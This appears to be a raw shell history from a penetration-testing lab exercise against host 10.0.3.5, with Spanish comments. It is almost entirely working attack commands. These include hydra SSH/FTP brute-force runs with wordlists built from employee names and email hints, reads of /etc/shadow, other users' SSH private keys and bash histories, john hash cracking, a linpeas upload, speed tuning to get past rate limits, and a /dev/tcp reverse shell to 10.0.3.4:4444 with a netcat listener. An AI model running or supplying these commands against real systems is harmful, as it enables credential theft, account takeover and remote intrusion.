ssh nmacgarry@10.0.3.5 "cat /etc/shadow"
# Leer historial de otros usuarios
ssh nmacgarry@10.0.3.5 "cat /home/*/.bash_history"
# Leer claves SSH de otros usuarios
ssh nmacgarry@10.0.3.5 "cat /home/*/.ssh/id_rsa"
# Ver versión del kernel
ssh nmacgarry@10.0.3.5 "uname -a"
# Buscar exploits para esa versión
searchsploit Ubuntu 22.04
# Test de comandos
for cmd in "id" "ls" "pwd" "whoami" "cat /etc/passwd" "uname -a" "sudo -l"; do     echo "=== $cmd ===";     ssh nmacgarry@10.0.3.5 "$cmd" 2>&1 | head -5;     echo ""; done
# Lista de usuarios típicos de Linux
cat > sys_users.txt << 'EOF'
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-network
systemd-resolve
systemd-timesync
messagebus
syslog
_apt
tss
uuidd
tcpdump
sshd
landscape
pollinate
ubuntu
debian
user
test
admin
administrator
ftp
mysql
postgres
redis
mongodb
EOF

# Probar "123" contra todos ellos
hydra -L sys_users.txt -p 123 ssh://10.0.3.5 -t 4 -v -o root_123.txt
clear
curl http://10.0.3.5/
history
history 
history | grep ssh
clear
ssh lames@10.0.3.5
ssh games@10.0.3.5
# Esto NO te da la contraseña, pero te dice qué usuarios son válidos
for user in lames games ames acosta alagia; do     echo "Probando usuario: $user";     (echo "$user"; sleep 1; echo "exit") | nc 10.0.3.5 22;     echo "---"; done
clear
nmap -p 22 --script ssh-auth-methods 10.0.3.5 --script-args="ssh.user=lames"
hydra -l lames -p "" -t 1 ssh://10.0.3.5 -v
ssh acosta@10.0.3.5
clear
ls
cd archivos/
ls
cat usuarios.txt
ls
# Crear carpeta
mkdir -p ~/archivos/ataques_triviales
cd ~/archivos/ataques_triviales
# Copiar usuarios.txt
cp ../usuarios.txt .
ls
#!/bin/bash
# Limpiar archivo anterior si existe
> combinaciones_triviales.txt
# Leer cada usuario y generar las combinaciones
while read user; do
    user=$(echo "$user" | xargs)    
    echo "$user:${user}123" >> combinaciones_triviales.txt    
    echo "$user:${user}1234" >> combinaciones_triviales.txt    
    echo "$user:1234" >> combinaciones_triviales.txt    
    echo "$user:123" >> combinaciones_triviales.txt    
    echo "$user:${user}2024" >> combinaciones_triviales.txt     done < usuarios.txt
# Ver cuántas combinaciones se generaron
echo "Total de combinaciones: $(wc -l combinaciones_triviales.txt)"
# Con -T 4 (4 tareas totales) y -t 1 (1 hilo por tarea)
hydra -C combinaciones_triviales.txt ssh://10.0.3.5 -T 4 -t 1 -w 2 -v -o resultados_triviales.txt
ssh nmacgarry@10.0.3.5
ftp 10.0.3.5
ftp -n 10.0.3.5 << EOF
user nmacgarry 123
ls
quit
EOF

# Escaneo rápido de puertos comunes
nmap -p 21,22,80,443,139,445,3306,5432,8080 10.0.3.5
# Usar curl para ver qué hay
curl -I http://10.0.3.5/
curl http://10.0.3.5/
# Buscar archivos comunes
for file in index.html index.php robots.txt .htaccess .htpasswd config.php wp-config.php; do     echo -n "Probando $file... ";     curl -s -o /dev/null -w "%{http_code}" http://10.0.3.5/$file;     echo ""; done
# Lista rápida de directorios comunes
for dir in admin login dashboard phpmyadmin wp-admin wordpress backup uploads cgi-bin images css js; do     echo -n "http://10.0.3.5/$dir ... ";     curl -s -o /dev/null -w "%{http_code}" http://10.0.3.5/$dir/;     echo ""; done
# Probar FTP anónimo
ftp -n 10.0.3.5 << EOF
user anonymous anonymous
ls
quit
EOF

clear
ssh nmacgarry@10.0.3.5 "id"
ssh nmacgarry@10.0.3.5 "ls -la"
ssh nmacgarry@10.0.3.5 "pwd"
ssh nmacgarry@10.0.3.5 "whoami"
ssh nmacgarry@10.0.3.5 "cat /etc/passwd | grep nmacgarry"
scp nmacgarry@10.0.3.5:/etc/passwd ./passwd_victima.txt
scp nmacgarry@10.0.3.5:/etc/group ./group_victima.txt
echo "test" > test.txt
scp test.txt nmacgarry@10.0.3.5:~/
sftp nmacgarry@10.0.3.5
ssh -L 8080:localhost:80 nmacgarry@10.0.3.5 -N -f
# Si python está instalado
ssh nmacgarry@10.0.3.5 "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
# O usar script
ssh nmacgarry@10.0.3.5 'bash -i'
# Compilar shell estática (en tu máquina local)
# O descargar un binario precompilado
# Subirlo con scp
scp /bin/bash nmacgarry@10.0.3.5:/tmp/mybash
# Ejecutarlo
ssh nmacgarry@10.0.3.5 "/tmp/mybash"
ssh nmacgarry@10.0.3.5 "bash -i >& /dev/tcp/10.0.3.4/4444 0>&1"
clear
vi combinaciones_espanol.tst
vi combinaciones_espanol.txt
while read user; do     user=$(echo "$user" | xargs);     while read pass; do         echo "$user:$pass" >> combinaciones_espanol_2.txt;     done < combinaciones_espanol.txt; done < ../usuarios.txt
ls
cat combinaciones_espanol_2.txt 
hydra -C combinaciones_espanol_2.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultados_espanol_2.txt
taskset -c 0 hydra -C combinaciones_espanol_2.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultados_espanol_2.txt
cd ~/archivos/ataques_triviales
# 1. Base: Lo que YA funcionó (patrón "123")
echo "123" > dict_hibrido.txt
echo "1234" >> dict_hibrido.txt
# 2. Añadir dict_contexto.txt
cat > dict_contexto.txt << 'EOF'
hackme
hackme123
hackme2024
hackme2023
hackme1234
HackMe
HackMe123
HackMe2024
hacker
hacking
security
secure
intranet
empresa
empresa123
empresa2024
admin
admin123
administrador
administrador123
root
root123
password
password123
123456
qwerty
abc123
monkey
dragon
master
sunshine
football
iloveyou
whatever
654321
qwerty123
passw0rd
123123
welcome
letmein
000000
111111
222222
333333
555555
777777
888888
999999
asdfgh
zxcvbn
q1w2e3
a1b2c3
zaq1xsw2
1qaz2wsx
qazwsx
123qwe
321qwe
123abc
abc123456
987654321
1234567890
12345
1234567
123456789
112233
121212
131313
141414
151515
EOF

# 3. Añadir variaciones con año actual y anterior
for year in 2024 2023 2022 2021 2020; do     echo "$year" >> dict_hibrido.txt;     echo "password$year" >> dict_hibrido.txt;     echo "admin$year" >> dict_hibrido.txt;     echo "hackme$year" >> dict_hibrido.txt;     echo "empresa$year" >> dict_hibrido.txt; done
# 4. Añadir apellidos comunes (los que viste en el HTML)
cat >> dict_hibrido.txt << 'EOF'
acosta
acosta123
acosta2024
racosta
jadrover
daguirre
gaguirre
ames
games
lames
alagia
bandieri
brunetti
calatayud
cirelli
fernandez
garcia
gonzalez
lopez
martinez
perez
rodriguez
sanchez
torres
EOF

cat dict_contexto.txt 
clear
cd ~/archivos/ataques_triviales
# 1. Base: Lo que YA funcionó (patrón "123")
echo "123" > dict_hibrido.txt
echo "1234" >> dict_hibrido.txt
# 2. Añadir dict_contexto.txt
cat > dict_contexto.txt << 'EOF'
hackme
hackme123
hackme2024
hackme2023
hackme1234
HackMe
HackMe123
HackMe2024
hacker
hacking
security
secure
intranet
empresa
empresa123
empresa2024
admin
admin123
administrador
administrador123
root
root123
password
password123
123456
qwerty
abc123
monkey
dragon
master
sunshine
football
iloveyou
whatever
654321
qwerty123
passw0rd
123123
welcome
letmein
000000
111111
222222
333333
555555
777777
888888
999999
asdfgh
zxcvbn
q1w2e3
a1b2c3
zaq1xsw2
1qaz2wsx
qazwsx
123qwe
321qwe
123abc
abc123456
987654321
1234567890
12345
1234567
123456789
112233
121212
131313
141414
151515
EOF

# 3. Añadir variaciones con año actual y anterior
for year in 2024 2023 2022 2021 2020; do     echo "$year" >> dict_hibrido.txt;     echo "password$year" >> dict_hibrido.txt;     echo "admin$year" >> dict_hibrido.txt;     echo "hackme$year" >> dict_hibrido.txt;     echo "empresa$year" >> dict_hibrido.txt; done
# 4. Añadir apellidos comunes (los que viste en el HTML)
cat >> dict_hibrido.txt << 'EOF'
acosta
acosta123
acosta2024
racosta
jadrover
daguirre
gaguirre
ames
games
lames
alagia
bandieri
brunetti
calatayud
cirelli
fernandez
garcia
gonzalez
lopez
martinez
perez
rodriguez
sanchez
torres
EOF

sort -u dict_hibrido.txt -o dict_hibrido.txt
cat dict_hibrido.txt 
vi dict_hibrido.txt 
sort -u dict_hibrido.txt -o dict_hibrido.txt
cat dict_hibrido.txt 
hydra -L usuarios.txt -P dict_hibrido.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultado_rapido.txt
cat dict_hibrido.txt 
ls
cat resultado_rapido.txt 
cat resultado_completo.txt 
cat resultados_espanol_2.txt 
cat resultados_triviales.txt 
history
ssh nmacgarry@10.0.3.5
cd a
cd archivos/
lls
ls
# Crear nueva carpeta
cd ~/archivos
mkdir -p ataque_basico
cd ataque_basico
# Copiar usuarios.txt
cp ../usuarios.txt .
cat > passwords_basicas.txt << 'EOF'
unouno
casa23
password
123456
12345
1234
123
qwerty
abc123
admin
root
hackme
empresa
EOF

> combinaciones_basicas.txt
while read user; do     user=$(echo "$user" | xargs);     [ -z "$user" ] && continue;     while read pass; do         echo "$user:$pass" >> combinaciones_basicas.txt;     done < passwords_basicas.txt; done < usuarios.txt
echo "Total combinaciones: $(wc -l < combinaciones_basicas.txt)"
echo "Usuarios: $(wc -l < usuarios.txt)"
echo "Contraseñas: $(wc -l < passwords_basicas.txt)"
hydra -C combinaciones_basicas.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultado_basico.txt
rm -f hydra.restore
clear
> user_pass.txt
while read user; do     user=$(echo "$user" | xargs);     [ -z "$user" ] && continue;     echo "$user:$user" >> user_pass.txt; done < usuarios.txt
cat passwords_basicas.txt > todas_pass.txt
cat usuarios.txt | while read u; do echo "$u" | xargs; done >> todas_pass.txt
sort -u todas_pass.txt -o todas_pass.txt
ls
cat todas_pass.txt 
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 4 -v -o resultado_final.txt
pkill hydra 2>/dev/null
rm -f hydra.restore*
rm -f hydra.*.restore
clear
rm -f .hydra*
history
clear
# 6. Ejecutar Hydra
echo ""
echo "=== INICIANDO ATAQUE ==="
echo "Comando: hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 4 -v -o resultado_final.txt"
echo ""
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 4 -v -o resultado_final.txt
# 7. Mostrar resultados
echo ""
echo "=== RESULTADOS FINALES ==="
cat resultado_final.txt
# 8. Buscar específicamente contraseñas encontradas
echo ""
echo "=== CREDENCIALES ENCONTRADAS ==="
grep -E "host:.*login:.*password:" resultado_final.txt 2>/dev/null || echo "No se encontraron credenciales"
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultado.txt
clear
cat > find_optimal.sh << 'EOF'
#!/bin/bash

echo "=== BUSCANDO CONFIGURACIÓN ÓPTIMA ==="
echo ""

# Configuraciones a probar
configs=(
    "t=4 w=2"
    "t=4 w=3"
    "t=3 w=2"
    "t=3 w=3"
    "t=2 w=2"
    "t=2 w=3"
    "t=2 w=4"
    "t=1 w=2"
    "t=1 w=3"
)

for config in "${configs[@]}"; do
    t=$(echo $config | grep -oP 't=\K\d')
    w=$(echo $config | grep -oP 'w=\K\d')
    
    echo "Probando: -t $t -w $w"
    
    # Ejecutar por 30 segundos y capturar velocidad
    output=$(timeout 95 hydra -L usuarios_test.txt -P passwords_test.txt ssh://10.0.3.5 -t $t -w $w -v 2>&1)
    
    # Extraer tries/min
    speed=$(echo "$output" | grep -oP 'STATUS\].*\K\d+(\.\d+)?(?= tries/min)' | head -1)
    
    if [ -n "$speed" ]; then
        echo "  -> Velocidad: $speed tries/min"
    else
        echo "  -> Error o bloqueado"
    fi
    
    # Verificar si hubo éxito
    if echo "$output" | grep -q "password:"; then
        echo "  ✅ ¡CREDENCIAL ENCONTRADA!"
        echo "$output" | grep "password:"
    fi
    
    echo ""
    sleep 5
done
EOF

chmod +x find_optimal.sh
./find_optimal.sh  # Descomenta para ejecutar
cd ~/archivos/ataques_triviales
# Crear grupo pequeño de prueba (primeros 20 usuarios)
head -20 usuarios.txt > usuarios_test.txt
echo "Usuarios de prueba: $(wc -l < usuarios_test.txt)"
# Crear contraseñas de prueba (pocas)
cat > passwords_test.txt << 'EOF'
123
1234
unouno
casa23
EOF

./find_optimal.sh  # Descomenta para ejecutarcat > find_optimal.sh << 'EOF'
#!/bin/bash
echo "=== BUSCANDO CONFIGURACIÓN ÓPTIMA ==="
echo ""
# Configuraciones a probar
configs=(     "t=4 w=2"     "t=4 w=3"     "t=3 w=2"     "t=3 w=3"     "t=2 w=2"     "t=2 w=3"     "t=2 w=4"     "t=1 w=2"     "t=1 w=3" )
for config in "${configs[@]}"; do     t=$(echo $config | grep -oP 't=\K\d');     w=$(echo $config | grep -oP 'w=\K\d')         echo "Probando: -t $t -w $w"    
    output=$(timeout 95 hydra -L usuarios_test.txt -P passwords_test.txt ssh://10.0.3.5 -t $t -w $w -v 2>&1)    
    speed=$(echo "$output" | grep -oP 'STATUS\].*\K\d+(\.\d+)?(?= tries/min)' | head -1)     ./find_optimal.sh  # Descomenta para ejecutarthen
cat > find_optimal.sh << 'EOF'
#!/bin/bash

echo "=== BUSCANDO CONFIGURACIÓN ÓPTIMA ==="
echo ""

# Configuraciones a probar
configs=(
    "t=4 w=2"
    "t=4 w=3"
    "t=3 w=2"
    "t=3 w=3"
    "t=2 w=2"
    "t=2 w=3"
    "t=2 w=4"
    "t=1 w=2"
    "t=1 w=3"
)

for config in "${configs[@]}"; do
    t=$(echo $config | grep -oP 't=\K\d')
    w=$(echo $config | grep -oP 'w=\K\d')
    
    echo "Probando: -t $t -w $w"
    
    # Ejecutar por 30 segundos y capturar velocidad
    output=$(timeout 35 hydra -L usuarios_test.txt -P passwords_test.txt ssh://10.0.3.5 -t $t -w $w -v 2>&1)
    
    # Extraer tries/min
    speed=$(echo "$output" | grep -oP 'STATUS\].*\K\d+(\.\d+)?(?= tries/min)' | head -1)
    
    if [ -n "$speed" ]; then
        echo "  -> Velocidad: $speed tries/min"
    else
        echo "  -> Error o bloqueado"
    fi
    
    # Verificar si hubo éxito
    if echo "$output" | grep -q "password:"; then
        echo "  ✅ ¡CREDENCIAL ENCONTRADA!"
        echo "$output" | grep "password:"
    fi
    
    echo ""
    sleep 5
done
EOF

chmod +x find_optimal.sh
# ./find_optimal.sh  # Descomenta para ejecutar
cat > find_optimal.sh << 'EOF'
#!/bin/bash

echo "=== BUSCANDO CONFIGURACIÓN ÓPTIMA ==="
echo ""

# Configuraciones a probar
configs=(
    "t=4 w=2"
    "t=4 w=3"
    "t=3 w=2"
    "t=3 w=3"
    "t=2 w=2"
    "t=2 w=3"
    "t=2 w=4"
    "t=1 w=2"
    "t=1 w=3"
)

for config in "${configs[@]}"; do
    t=$(echo $config | grep -oP 't=\K\d')
    w=$(echo $config | grep -oP 'w=\K\d')
    
    echo "Probando: -t $t -w $w"
    
    # Ejecutar por 30 segundos y capturar velocidad
    output=$(timeout 35 hydra -L usuarios_test.txt -P passwords_test.txt ssh://10.0.3.5 -t $t -w $w -v 2>&1)
    
    # Extraer tries/min
    speed=$(echo "$output" | grep -oP 'STATUS\].*\K\d+(\.\d+)?(?= tries/min)' | head -1)
    
    if [ -n "$speed" ]; then
        echo "  -> Velocidad: $speed tries/min"
    else
        echo "  -> Error o bloqueado"
    fi
    
    # Verificar si hubo éxito
    if echo "$output" | grep -q "password:"; then
        echo "  ✅ ¡CREDENCIAL ENCONTRADA!"
        echo "$output" | grep "password:"
    fi
    
    echo ""
    sleep 5
done
EOF

chmod +x find_optimal.sh
# ./find_optimal.sh  # Descomenta para ejecutar
./find_optimal.sh 
ssh nmacgarry@10.0.3.5
cd ..
ls
cd ataque_basico/
ls
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultado.txt
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 5 -w 2 -v -o resultado.txt
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 5 -w 1 -v -o resultado.txt
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 8 -w 1 -v -o resultado.txt
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 6 -w 1 -v -o resultado.txt
hydra -L usuarios.txt -P todas_pass.txt ssh://10.0.3.5 -t 5 -w 1 -v -o resultado.txt
clear
hydra -L usuarios.txt -p "123" ssh://10.0.3.5 -t 5 -w 1 -v -o resultado_123.txt
clera
clear
hydra -L usuarios.txt -p "123" ssh://10.0.3.5 -t 5 -w 2 -v -o resultado_123.txt
hydra -L usuarios.txt -p "123" ssh://10.0.3.5 -t 5 -w 1 -v -o resultado_123.txt
hydra -L usuarios.txt -p "123" ssh://10.0.3.5 -t 4 -w 1 -v -o resultado_123.txt
hydra -L usuarios.txt -p "123" ssh://10.0.3.5 -t 6 -w 2 -v -o resultado_123.txt
hydra -L usuarios.txt -p "321" ssh://10.0.3.5 -t 5 -w 2 -v -o resultado_123.txt
hydra -L usuarios.txt -p "321" ssh://10.0.3.5 -t 4 -w 2 -v -o resultado_123.txt
exit
ls
clear
rm -rf ~/archivos/*
ls
cd archivos/
ls
# Herramientas del lab
which john hydra nmap netcat nc sqlmap metasploit msfconsole linpeas.sh
# Versiones
john --version
hydra -h 2>&1 | head -5
nmap --version
# Lenguajes
python3 --version
python --version
python3 -c "import sys; print(sys.version)"
gcc --version
g++ --version
make --version
# Shells disponibles
cat /etc/shells
# Editores
which nano vim vi emacs
clear
mkdir ataque_usuario_extenso
cd ataque_usuario_extenso/
nano usuarios.txt
while read user; do echo "$user:$user"; done < usuarios.txt > usuarios_mismatch.txt
ls
[200~head -5 usuarios_mismatch.txt~
head -50 usuarios_mismatch.txt
hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 5 -w 2.3 -v -o resultados_mismatch.txt
hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 5 -w 2.6 -v -o resultados_mismatch.txt
hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 5 -w 2.6 -v -o resultados_mismatch.txt -I
nc -lvnp 4444
exit
ls
cd archivos/
ls
mkdir ataque_empleados_html
cd ataque_empleados_html/
nano password_internos.txt
nano users.txt
hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
hydra -L users.txt -P password_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
ls
rm hydra.restore 
rm hydra_test.txt 
rm password_internos.txt 
rm users.txt 
nano password_internos.txt
nano users.txt
hydra -L users.txt -P password_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
rm password_internos.txt 
nano pasword_internos.txt
hydra -L users.txt -P password_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
rm pasword_internos.txt 
nano password_internos.txt
hydra -L users.txt -P password_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
ls
nano password_internos.txt 
nano users.txt 
cat > passwords_del_correo.txt << 'EOF'
Oracular
Oriole
oracular
oriol
OracularOriole
oracularoriole
ubuntu24
ubuntu2410
24.10
2410
Oracular2024
oracular2024
Oriole2024
oriole2024
ubuntu
Ubuntu
UBUNTU
EOF

hydra -L users.txt -P passwords_del_correo.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
nano passwords_del_correo.txt 
hydra -L users.txt -P passwords_del_correo.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
# Ver herramientas comunes de pentesting
ls -la /usr/bin/{hydra,john,zip2john,ssh,scp,nmap,nc,netcat,curl,wget,sqlmap} 2>/dev/null
# O mejor, buscar herramientas instaladas
ls /usr/share/{hydra,john,wordlists} 2>/dev/null
ls /usr/local/bin/ 2>/dev/null
nmap -sS --open 192.168.44.0/24
sudo nmap -sS --open 192.168.44.0/24
clear
ip a
nmap -sn 10.0.3.0/24
arp-scan 10.0.3.0/24
for i in {1..254}; do (ping -c 1 -W 1 192.168.44.$i > /dev/null && echo "Host 10.0.3.$i está activo") & done
clear
# Escanear puertos de 10.0.3.5
nmap -sT --open 10.0.3.5
# Si quieres más detalles (versiones de servicios)
nmap -sT -sV --open 10.0.3.5
wget --mirror      --convert-links      --adjust-extension      --page-requisites      --no-parent      --wait=1      --limit-rate=100k      -P ./sitio_web      http://10.0.3.5/
# Usar --no-proxy para ignorar el proxy
wget --no-proxy --mirror --convert-links --adjust-extension --page-requisites --no-parent --wait=1 --limit-rate=100k -P ./sitio_web http://10.0.3.5/
ls
cd sitio_web/
ls
cd 10.0.3.5/
ls
clear
ftp surreta@10.0.3.5
clear
ssh daguirre@10.0.3.5
cd ..
cd .
cd ..
mkdir daguirre
cd daguirre/
scp daguirre@10.0.3.5:/home/daguirre/flag.txt .
scp -r daguirre@10.0.3.5:/home/daguirre/ ./victim_home/
exit
ssh daguirre@10.0.3.5
scp /usr/local/bin/linpeas.sh daguirre@10.0.3.5:/tmp/
ls
scp -r fsi:~/archivos ./scp
exit
cd practico2/
cat mail
nano pass_jadrover_pistas.txt
ls
grep '^jadrover:' shadow.bak > jadrover_shadow.txt
john --format=sha512crypt --wordlist=pass_jadrover_pistas.txt jadrover_shadow.txt
john --wordlist=pass_jadrover_pistas.txt jadrover_shadow.txt
hydra -l jadrover -P pass_jadrover_pistas.txt ssh://10.0.3.5 -t 4 -I -o hydra_jadrover_pistas.txt
john --session=jadrover --wordlist=pass_jadrover_pistas.txt jadrover_shadow.txt
john --show jadrover_shadow.txt
cat > jadrover_base.txt << 'EOF'
ubuntu
Ubuntu
oracular
Oracular
oriole
Oriole
oraculo
oriol
jorge
Jorge
adrover
Adrover
jadrover
Jadrover
release
releases
OracularOriole
oracularoriole
Oracular_Oriole
oracular_oriole
Oracular-Oriole
oracular-oriole
UbuntuOracular
ubuntuoracular
UbuntuOriole
ubuntuoriole
UbuntuOracularOriole
ubuntuoracularoriole
EOF

for s in 1 12 123 1234 2023 2024 24 2410 24.10 10 1010; do   sed "s/$/$s/" jadrover_base.txt; done > jadrover_sufijos.txt
for p in 1 12 123 2023 2024 24 2410; do   sed "s/^/$p/" jadrover_base.txt; done > jadrover_prefijos.txt
cat jadrover_base.txt jadrover_sufijos.txt jadrover_prefijos.txt | sort -u > pass_jadrover_big.txt
wc -l pass_jadrover_big.txt
head pass_jadrover_big.txt
john --session=jadrover_big --format=crypt --wordlist=pass_jadrover_big.txt jadrover_shadow.txt
john --show jadrover_shadow.txt
ls
rm jadrover.log 
ls
rm jadrover_base.txt 
rm jadrover_prefijos.txt 
rm hydra_jadrover_pistas.txt 
ls
rm combos_apellido.txt 
ls
rm pass_jadrover_pistas.txt 
ls
rm jadrover_big.log 
ls
rm jadrover_sufijos.txt 
ls
john --session=jadrover_big_rules --format=crypt --wordlist=pass_jadrover_big.txt --rules jadrover_shadow.txt
john --show jadrover_shadow.txt
ls
rm jadrover_big_rules.log 
ls
ls -la /tmp/
scp daguirre@10.0.3.5:/tmp/linpeas_output.txt ~/archivos/
ls
clear
ssh daguirre@10.0.3.5
ls
# En attacker-3 (fsi03)
ls -la /usr/lib/x86_64-linux-gnu/security/ | grep -E "passwdqc|google"
# Buscar en todo el sistema
find / -name "pam_passwdqc.so" 2>/dev/null
# Ver paquetes instalados
dpkg -l | grep passwdqc
ls -la /usr/local/bin/linpeas.sh
# Desde attacker-3
scp /usr/share/john/linpeas.sh daguirre@10.0.3.5:/tmp/linpeas.sh
# Desde attacker-3, usando la ruta correcta
scp /usr/local/bin/linpeas.sh daguirre@10.0.3.5:/tmp/linpeas.sh
ssh daguirre@10.0.3.5
clear
ssh daguirre@10.0.3.5
# Desde attacker-3 (fsi03), copiar a la víctima
scp ~/archivos/libpam-passwdqc_2.0.3-1build1_amd64.deb daguirre@10.0.3.5:/tmp/
scp ~/archivos/libpam-google-authenticator_20191231-2build1_amd64.deb daguirre@10.0.3.5:/tmp/
grep -E "^(root|jadrover):" hashes.txt > root_jadrover.txt
clear
nano root_jadrover.txt
hydra -l jadrover -p "OracularOriole" ssh://10.0.3.5 -t 4 -v -f
hydra -L users.txt -p "123456" ssh://10.0.3.5 -t 4 -v -f
hydra -L root_jadrover.txt -p "123456" ssh://10.0.3.5 -t 4 -v -f
hydra -L root_jadrover.txt -p "fsi2026" ssh://10.0.3.5 -t 4 -v -f
hydra -L root_jadrover.txt -p "fsi2025" ssh://10.0.3.5 -t 4 -v -f
hydra -L root_jadrover.txt -p "unouno" ssh://10.0.3.5 -t 4 -v -f
hydra -L root_jadrover.txt -p "casa23" ssh://10.0.3.5 -t 4 -v -f
hydra -L root_jadrover.txt -p "adminadmin" ssh://10.0.3.5 -t 4 -v -f
cat > /tmp/pass_extensas.txt << 'EOF'
# Contexto directo de la empresa y correos
jadrover
Jadrover
JADROVER
jorge.adrover
Jorge.Adrover
JORGE.ADROVER
jadrover2024
Jadrover2024
jadrover2025
jadrover2026

# Basado en la figura 1 (contraseñas comunes según el gráfico de Hive Systems)
password
123456
12345678
123456789
qwerty
qwerty123
abc123
admin
admin123
welcome
welcome123
letmein
letmein123
passw0rd
Password1
Password2024
root
toor
root123
Root123
ROOT123

# Mutaciones simples (como dice el lab: "unouno" o "casa23")
jadrover1
jadrover12
jadrover123
jadrover1234
jadroverj
jadroverjadrover
jadrover2020
jadrover2021
jadrover2022
jadrover2023
jadrover2024
jadrover2025

root1
root12
root123
root1234
rootroot
rootroot123
root2024
Root2024

# Basado en la empresa "HackMe"
hackme
HackMe
HACKME
hackme2024
HackMe2024
hackme123
hackme1234
empresa
empresa2024
empresa123

# Basado en el sistema operativo (Ubuntu 22.04)
ubuntu
ubuntu22
ubuntu2204
Ubuntu22
Ubuntu2204
UBUNTU
linux
linux123
linux2024

# Basado en el correo de Jorge Adrover (Oracular Oriole)
OracularOriole
oracularoriole
ORACULARORIOLE
OracularOriole2024
oracularoriole2024
Oracular2024
Oriole2024
24.10
2410
ubuntu24.10
Ubuntu24.10

# Nombres de versiones de Ubuntu (históricas)
FocalFossa
focalfossa
BionicBeaver
bionicbeaver
XenialXerus
xenialxerus
JammyJellyfish
jammyjellyfish
NobleNumbat
noblenumbat

# Palabras en español comunes (diccionario)
contraseña
Contraseña
CONTRASEÑA
password123
admin123
usuario
Usuario
administrador
Administrador
ADMINISTRADOR
bienvenido
Bienvenido
BIENVENIDO
seguridad
Seguridad
SEGURIDAD

# Números simples y patrones
000000
111111
222222
333333
444444
555555
666666
777777
888888
999999
123321
123123
112233
121212

# Deportes y animales (comunes en contraseñas)
futbol
Futbol
FUTBOL
realMadrid
barcelona
Barcelona
perro
gato
caballo
tigre
leon

# Fechas comunes (cumpleaños, años)
01012024
15082024
2024
2025
2026
1980
1990
2000

# Con símbolos (complejidad mínima)
jadrover!
Jadrover!
jadrover# 
Jadrover#
root!
Root!
admin!
Admin!
hackme!
HackMe!
password!
Password!
EOF

hydra -L root_jadrover.txt -p "casa23" ssh://10.0.3.5 -t 4 -v -clear
clear
hydra -L root_jadrover.txt -P pass_extensas.txt ssh://10.0.3.5 -t 4 -v -clear
hydra -L root_jadrover.txt -P /tmp.pass_extensas.txt ssh://10.0.3.5 -t 4 -v -clear
hydra -L root_jadrover.txt -P /tmp/pass_extensas.txt ssh://10.0.3.5 -t 4 -v -clear
hydra -L root_jadrover.txt -P /tmp/pass_extensas.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt
ssh daguirre@10.0.3.5
nano test_incremental.sh
chmod +x test_incremental.sh
./test_incremental.sh
ftp daguirre@10.0.3.5
